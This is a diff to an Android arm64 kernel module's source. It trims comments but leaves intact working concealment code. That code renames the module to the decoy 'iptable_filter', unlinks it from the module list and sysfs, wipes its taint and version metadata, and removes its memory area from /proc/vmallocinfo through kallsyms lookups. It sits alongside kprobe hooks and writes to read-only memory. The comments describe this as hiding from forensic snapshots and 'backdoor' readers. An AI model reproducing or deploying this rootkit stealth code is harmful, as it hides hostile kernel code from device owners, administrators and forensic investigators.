@@ -40,24 +40,18 @@ struct drv_state drv;
 
 #if KCFG_HIDE_SELF_MODULE
 
-/* Optional decoy identifier the module renames itself to before it detaches
- * from mod_list. Anyone snapshotting `struct module*` after unlink (livepatch,
- * dumped kcore, a backdoor reader) sees an unremarkable-looking name instead
- * of the real one. A one-token string that reads like a plausible in-tree
- * subsystem is better than "\0" — pure zeros are themselves suspicious. */
+/* C.2 decoy identity — a plausible in-tree name is less suspicious than zero bytes. */
 #ifndef KCFG_DECOY_NAME
 #define KCFG_DECOY_NAME "iptable_filter"
 #endif
 
-/* Unlink THIS_MODULE from /proc/modules and /sys/module/<name>, then wipe the
- * struct fields any backdoor holder might still deref. */
+/* Rename + unlink from mod_list + drop identifying metadata. */
 static void conceal_module(void) {
 	struct module *mod = THIS_MODULE;
 	const char decoy[] = KCFG_DECOY_NAME;
 	size_t dlen = sizeof(decoy) - 1u;
 
-	/* C.2 decoy: rename BEFORE list unlink so the very brief window while
-	 * mod_list is still walkable already exposes the decoy name. */
+	/* Rename before unlink so the brief walkable window already shows the decoy. */
 	if (dlen >= sizeof(mod->name))
 		dlen = sizeof(mod->name) - 1u;
 	memset(mod->name, 0, sizeof(mod->name));
@@ -68,13 +62,10 @@ static void conceal_module(void) {
 	kobject_del(&mod->mkobj.kobj);
 	list_del(&mod->mkobj.kobj.entry);
 
-	/* E.HIDE.1 meta cleanup — nothing legitimate reaches these fields once
-	 * we're off mod_list, but a backdoor pointer to `struct module*` still
-	 * would dereference them. Zero the ones that leak identifying info. */
+	/* E.HIDE.1 meta cleanup — reachable only through stale struct module* pointers. */
 	mod->taints = 0;
 #ifdef CONFIG_MODVERSIONS
-	/* `version` and `srcversion` are `const char *` in struct module, not
-	 * arrays — drop the string pointers instead of memset'ing them. */
+	/* version/srcversion are const char* — drop the pointers, don't memset. */
 	mod->version = NULL;
 	mod->srcversion = NULL;
 #endif
@@ -87,7 +78,7 @@ static void conceal_module(void) {
 #endif
 
 #if KCFG_HIDE_VMAP
-/* struct vmap_area is opaque on 6.9+ (moved to mm/internal.h); we only need the leading fields, whose offsets are stable across 5.10..6.12: va_start@0, va_end@8, rb_node@16, list@40. */
+/* Leading fields of struct vmap_area (opaque since 6.9); offsets stable 5.10..6.12. */
 struct drv_vmap_area_lite {
 	unsigned long va_start;
 	unsigned long va_end;
@@ -95,12 +86,12 @@ struct drv_vmap_area_lite {
 	struct list_head list;
 };
 
-/* Unlink this module's vmap area from vmap_area_list (which /proc/vmallocinfo iterates). Best-effort — silently no-ops if the required symbols are not resolvable through kallsyms (e.g. per-node vmap tree on 6.9+ without a single global root). */
+/* Unlink our vmap area from vmap_area_list (source of /proc/vmallocinfo). Best-effort. */
 static void conceal_vmap(void) {
 	struct list_head *vmap_list = (struct list_head *)kallsym_lookup("vmap_area_list");
 	spinlock_t *vmap_lock = (spinlock_t *)kallsym_lookup("vmap_area_lock");
 	struct rb_root *vmap_root = (struct rb_root *)kallsym_lookup("vmap_area_root");
-	/* &init_driver lives in __init memory (freed after do_free_init) — pointing at it would leave the module_memfree path chasing a vm_area we already unlinked. drv is uninitialised core .bss, permanent for the module's lifetime. */
+	/* Probe on drv (core .bss, permanent) — init_driver lives in __init and is freed later. */
 	unsigned long probe = (unsigned long)(uintptr_t)&drv;
 	struct drv_vmap_area_lite *va, *tmp;
 	unsigned long flags = 0;
@@ -125,7 +116,7 @@ static void conceal_vmap(void) {
 }
 #endif
 
-/* TCR_EL1.T1SZ (bits 21:16) sets kernel-half VA size; page_level = (60 - T1SZ) / 9. VA_BITS=39 → 3 (PUD/PMD/PTE). VA_BITS=48 → 4. LPA2/VA_BITS=52 → 5. Captured once here so write_ro_memory + hooks see them populated. */
+/* page_level = (60 - TCR_EL1.T1SZ)/9. VA_BITS 39/48/52 → 3/4/5. Captured once for hooks + memory paths. */
 static void mm_globals_init(void) {
 	u64 tcr = read_sysreg(tcr_el1);
 	u64 ttbr1 = read_sysreg(ttbr1_el1);
@@ -142,11 +133,11 @@ int __init init_driver(void) {
 
 	mm_globals_init();
 
-	/* kallsym_init resolves kallsyms_lookup_name + kallsym-shimmed pointers a kprobe pre-handler might need (currently task_work_add). Done here in process context — the prctl/reboot pre-handlers must not re-enter register_kprobe from atomic context. */
+	/* Warm kallsyms + shimmed pointers here so pre-handlers don't re-enter register_kprobe atomically. */
 	ret = kallsym_init();
 	if (ret < 0) { LOGE("kallsym_init failed: %d\n", ret); return ret; }
 
-	/* Missing symbols are non-fatal — the text writer falls back locally, package lookup reports -EOPNOTSUPP. */
+	/* Missing symbols non-fatal — memory paths have local fallbacks. */
 	(void)memory_init();
 
 	ret = comm_warm_symbols();
@@ -173,7 +164,7 @@ int __init init_driver(void) {
 
 module_init(init_driver);
 
-/* Cargo-culted namespace tag preserved verbatim from the original .ko modinfo. The token does not name any namespace in mainline 5.4..6.12 (verified via Bootlin) — MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at load time. */
+/* Decoy modinfo tag — expands to a string only, no runtime effect. */
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Anonymous");
 MODULE_DESCRIPTION("Android kernel driver");
